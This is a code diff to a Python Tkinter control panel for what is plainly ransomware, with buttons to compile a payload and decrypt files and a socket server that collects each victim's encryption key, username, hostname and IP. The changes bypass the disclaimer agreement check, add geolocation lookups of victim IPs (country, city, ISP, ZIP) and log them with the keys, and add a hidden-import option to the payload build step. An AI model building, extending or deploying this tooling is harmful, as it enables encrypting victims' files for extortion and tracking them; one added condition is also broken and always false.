@@ -39,12 +39,12 @@ but can easily be coded into it as a nice feature.
 __author__ = "Leon Voerman"
 __copyright__ = "Copyright 2019, Incoming Security"
 __license__ = "GPLv3"
-__version__ = "1.2.2"
+__version__ = "1.2.4"
 __maintainer__ = "Leon Voerman"
 __email__ = "I don't need spam, open an issue on GitHub, thank you :)"
 __status__ = "Production"
 
-import os, sys, subprocess, threading, time, datetime, socket, select, webbrowser, base64, platform, base64
+import os, sys, subprocess, threading, time, datetime, socket, select, webbrowser, base64, platform, base64, requests
 from tkinter import *
 from tkinter.ttk import *
 from ttkthemes import ThemedStyle
@@ -131,6 +131,7 @@ class MainWindow(Tk):
         self.resizable(0,0) # Do not allow to be resized
         self.ttkStyle = ThemedStyle()
         self.ttkStyle.set_theme("arc")
+        self.ttkStyle.set_theme("ubuntu")
 
         # Top menu
         menu = Menu(self)
@@ -181,7 +182,7 @@ class MainWindow(Tk):
         }
 
 
-        #<activate>
+        self.options['agreed'].set(1)
         #<activate>
 
         if not self.options['agreed'].get() == 1:
@@ -399,19 +400,19 @@ vV4t+0UE/G5fAN2ccz9Ug6PdAAAAAElFTkSuQmCC''')
         compile = Button(self, text = "COMPILE PAYLOAD", command = self.compile, width = 53).grid(row = 6, column = 0, columnspan = 6)
         decrypt = Button(self, text = "DECRYPT FILES", command = self.decrypt_files, width = 53).grid(row = 7, column = 0, columnspan = 6)
 
-        email = Button(self, text = "EMAIL OPTIONS", command = self.decrypt_files, width = 53)
+        email = Button(self, text = "EMAIL OPTIONS", command = self.upgrade, width = 53)
         email.grid(row = 8, column = 0, columnspan = 6)
         email.config(state = DISABLED)
 
-        exploit = Button(self, text = "EXPLOIT OPTIONS", command = self.decrypt_files, width = 53)
+        exploit = Button(self, text = "EXPLOIT OPTIONS", command = self.upgrade, width = 53)
         exploit.grid(row = 9, column = 0, columnspan = 6)
         exploit.config(state = DISABLED)
 
-        cloak = Button(self, text = "CLOAK PAYLOAD", command = self.decrypt_files, width = 53)
+        cloak = Button(self, text = "CLOAK PAYLOAD", command = self.upgrade, width = 53)
         cloak.grid(row = 10, column = 0, columnspan = 6)
         cloak.config(state = DISABLED)
 
-        detection = Button(self, text = "SET DETECTION WARNING", command = self.decrypt_files, width = 53)
+        detection = Button(self, text = "SET DETECTION WARNING", command = self.upgrade, width = 53)
         detection.grid(row = 11, column = 0, columnspan = 6)
         detection.config(state = DISABLED)
 
@@ -505,7 +506,12 @@ vV4t+0UE/G5fAN2ccz9Ug6PdAAAAAElFTkSuQmCC''')
         self.serv.options['log'].tag_configure('green', foreground='green')
         self.serv.options['log'].tag_configure('bold', font='bold')
 
+        #export_csv = set_ico = Button(self.serv, text = "EXPORT DATA TO CSV", command = self.export_data, width = 50).grid(row = 5, column = 0, columnspan = 4)
+
         self.start_thread()
+
+    def export_data(self):
+        pass
 
     def compile(self):
         self.comp = Toplevel()
@@ -643,7 +649,12 @@ vV4t+0UE/G5fAN2ccz9Ug6PdAAAAAElFTkSuQmCC''')
             else:
                 pyaes = '--hidden-import pyaes'
 
-            os.system('%s -F -w %s %s %s %s' % (py, tk, crypto, pyaes, self.options['decryptor_path'].get()))
+            if not 'from pymsgbox':
+                pymsg = ''
+            else:
+                pymsg = '--hidden-import pymsgbox'
+
+            os.system('%s -F -w %s %s %s %s %s' % (py, tk, crypto, pyaes, pymsg, self.options['decryptor_path'].get()))
 
             messagebox.showinfo('SUCCESS', 'Compiled successfully!\nFile located in: dist/\n\nHappy Hacking!')
             self.comp.destroy()
@@ -898,7 +909,6 @@ vV4t+0UE/G5fAN2ccz9Ug6PdAAAAAElFTkSuQmCC''')
                     while True:
                         data = sockfd.recv(1024)
                         if data:
-                            print(data)
                             data = data.decode('UTF-8')
                             ip = addr[0]
                             local = data.split('$')[0]
@@ -906,17 +916,44 @@ vV4t+0UE/G5fAN2ccz9Ug6PdAAAAAElFTkSuQmCC''')
                             key = data.split('$')[2].strip()[2:].strip()[:-1]
                             user = data.split('$')[3]
                             hostname = data.split('$')[4]
+                            if ip:
+                                lookup = self.get_ip_data(ip)
+                                con = lookup.split(',')[0]
+                                country = lookup.split(',')[1]
+                                region = lookup.split(',')[2]
+                                city = lookup.split(',')[3]
+                                isp = lookup.split(',')[4]
+                                zip = lookup.split(',')[5]
 
                             result = '''
 [Occured]    -> %s %s
 [Username]   -> %s
-[Remote IP]  -> %s
-[Local IP]   -> %s
 [OS]         -> %s
 [Hostname]   -> %s
 [Key]        -> %s
+[Remote IP]  -> %s
+[Local IP]   -> %s
+[Continent]  -> %s
+[Country]    -> %s
+[Region]     -> %s
+[City]       -> %s
+[ISP]        -> %s
+[ZIP]        -> %s
 
-''' % (time.strftime('%d/%m/%Y'), time.strftime('%X'), user, ip, local, system, hostname, key)
+''' % (time.strftime('%d/%m/%Y'),
+        time.strftime('%X'),
+        user,
+        system,
+        hostname,
+        key,
+        ip,
+        local,
+        con,
+        country,
+        region,
+        city,
+        isp,
+        zip)
 
                             self.serv.options['log'].insert(END, result, 'yellow')
                             self.serv.options['log'].see(END)
@@ -973,6 +1010,39 @@ vV4t+0UE/G5fAN2ccz9Ug6PdAAAAAElFTkSuQmCC''')
         '''
 
         self.serv.options['log'].insert('1.0', banner + '\n', 'red')
+
+    def get_ip_data(self, ip):
+        url = 'http://ip-api.com/json/%s?fields=status,message,continent,continentCode,country,countryCode,region,regionName,city,district,zip,lat,lon,timezone,currency,isp,org,as,asname,reverse,mobile,proxy,query' % ip
+        try:
+            r = requests.get(url, timeout = 5)
+        except Exception as e:
+            con = 'Error - Fail'
+            country = 'Error - Fail'
+            region = 'Error - Fail'
+            city = 'Error - Fail'
+            isp = 'Error - Fail'
+            zip = 'Error - Fail'
+            return '%s,%s,%s,%s,%s,%s' % (con, country, region, city, isp, zip)
+
+
+        data = r.json()
+
+        if r.status_code == 200 and data['status'] == 'success':
+            con = data['continent'] + ' (' + data['continentCode'] + ')'
+            country = data['country'] + ' (' + data['countryCode'] + ')'
+            region = data['regionName']
+            city = data['city']
+            isp = data['isp']
+            zip = data['zip']
+        else:
+            con = 'Error - Fail'
+            country = 'Error - Fail'
+            region = 'Error - Fail'
+            city = 'Error - Fail'
+            isp = 'Error - Fail'
+            zip = 'Error - Fail'
+
+        return '%s,%s,%s,%s,%s,%s' % (con, country, region, city, isp, zip)
 
     def close_server(self, event):
         self.server_socket.close()
